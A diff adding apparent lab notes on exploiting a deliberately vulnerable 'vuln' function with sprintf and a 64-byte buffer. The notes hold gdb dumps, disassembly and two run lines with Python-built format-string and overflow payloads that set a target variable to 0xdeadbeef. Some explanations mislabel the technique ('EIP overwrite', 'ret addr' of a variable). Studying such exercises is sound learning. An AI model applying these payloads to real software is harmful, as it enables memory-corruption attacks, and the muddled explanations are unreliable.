@@ -1,0 +1,153 @@
+1. 
+
+The format string vulnerability is located in the "void vuln(char *string)".
+
+The beginning of the buffer was observed using:
+
+(gdb) x/-40wx $esp
+
+A little tinkering and I located the beginning of the buffer @:
+
+0xffffd19c
+
+("A" * 80 + "B" *4)
+
+0xffffd19c:	0x41414141	0x41414141	0x41414141	0x41414141
+0xffffd1ac:	0x41414141	0x41414141	0x41414141	0x41414141
+0xffffd1bc:	0x41414141	0x41414141	0x41414141	0x41414141
+0xffffd1cc:	0x41414141	0x41414141	0x41414141	0x41414141
+0xffffd1dc:	0x41414141	0x41414141	0x41414141	0x41414141
+0xffffd1ec:	0x42424242
+
+
+The "char buffer[64]" has a MAX of 64. If we go over that then
+it's a buffer overflow. Right after creating "char buffer[64]",
+'target' is initalized with 0. On the stack it represents the same:
+
+0x56555584 <+7>:	call   0x56555480 <__x86.get_pc_thunk.bx>
+0x56555589 <+12>:	add    ebx,0x1a77
+0x5655558f <+18>:	mov    DWORD PTR [ebp-0xc],0x0
+0x56555596 <+25>:	sub    esp,0x8
+0x56555599 <+28>:	push   DWORD PTR [ebp+0x8]
+0x5655559c <+31>:	lea    eax,[ebp-0x4c]
+0x5655559f <+34>:	push   eax
+0x565555a0 <+35>:	call   0x56555420 <sprintf@plt>
+
+
+
+target = 0;
+0x5655558f <+18>:	mov    DWORD PTR [ebp-0xc],0x0
+
+
+sprintf(buffer, string);
+0x565555a0 <+35>:	call   0x56555420 <sprintf@plt>
+
+
+
+
+void vuln(char *string)
+{
+  volatile int target;
+  char buffer[64];
+
+  target = 0;
+
+  sprintf(buffer, string);
+
+  printf("Target: %08x\n", &target);
+  printf("Buffer: %08x\n", &buffer);
+
+  if(target == 0xdeadbeef) {
+      printf("you have hit the target correctly :)\n");
+  }
+}
+
+
+
+2. EIP overwrite. Since we can overwrite EIP let's point to the variable
+	'target'.
+
+gdb
+
+run "`python -c 'print "A" * 80 + "B" * 4'`"
+
+Done.
+
+
+3. Locate the variable location on the stack & replace "BBBB" with ret addr
+	of target.
+
+
+Finding target:
+
+This is the buffer filled with "A" without overflow.
+(4 * 16 = 64)
+
+0xffffd19c:	0x41414141	0x41414141	0x41414141	0x41414141
+0xffffd1ac:	0x41414141	0x41414141	0x41414141	0x41414141
+0xffffd1bc:	0x41414141	0x41414141	0x41414141	0x41414141
+0xffffd1cc:	0x41414141	0x41414141	0x41414141	0x41414141
+
+The NEXT address is target, because looking at the code:
+
+volatile int target;
+char buffer[64];
+
+target = 0;
+
+sprintf(buffer, string);
+
+we can see that 'target' is next to 'char buffer[64]'
+
+0xffffd1dc:	0x41414141	0x41414141	0x41414141	0x41414141
+target:	    |--------|
+
+
+
+4. Locate method #2.
+
+
+target location: EBP-0xc(12) : 
+
+0xffffd1dc:	0x41414141	0x41414141	0x41414141	0x41414141
+0xffffd1ec:	0xdeadbeef	0xdeadbeef	0xdeadbeef	0xdeadbeef
+
+   0x5655558f <+18>:	mov    DWORD PTR [ebp-0xc],0x0
+
+   0x565555d4 <+87>:	mov    eax,DWORD PTR [ebp-0xc]
+   0x565555d7 <+90>:	cmp    eax,0xdeadbeef
+
+
+a. This first instruction moves whatever is in "EBP-0xc(12)" into register
+	EAX.
+
+b.  0xdeadbeef is compared with EAX.
+
+   0x565555d4 <+87>:	mov    eax,DWORD PTR [ebp-0xc]	; Move data to EAX
+=> 0x565555d7 <+90>:	cmp    eax,0xdeadbeef			; cmp EAX w/ deadbeef
+   0x565555dc <+95>:	jne    0x565555f0 <vuln+115>
+   0x565555de <+97>:	sub    esp,0xc
+   0x565555e1 <+100>:	lea    eax,[ebx-0x1924]
+   0x565555e7 <+106>:	push   eax
+   0x565555e8 <+107>:	call   0x56555400 <puts@plt>
+   0x565555ed <+112>:	add    esp,0x10
+   0x565555f0 <+115>:	nop
+   0x565555f1 <+116>:	mov    ebx,DWORD PTR [ebp-0x4]
+   0x565555f4 <+119>:	leave  
+   0x565555f5 <+120>:	ret    
+End of assembler dump.
+
+Let's find the ret addr address of [ebp-0xc]
+
+(gdb) x/-8wx $ebp-0xc
+0xffffd1cc:	0x41414141	0x41414141	0x41414141	0x41414141
+0xffffd1dc:	0x41414141	0x41414141	0x41414141	0x41414141
+
+
+
+5. Exploit
+
+
+(gdb) run %64x"`python -c 'print "\xef\xbe\xad\xde"'`"
+(gdb) run "`python -c 'print "A" * 64 + "\xef\xbe\xad\xde" * 4'`"
+
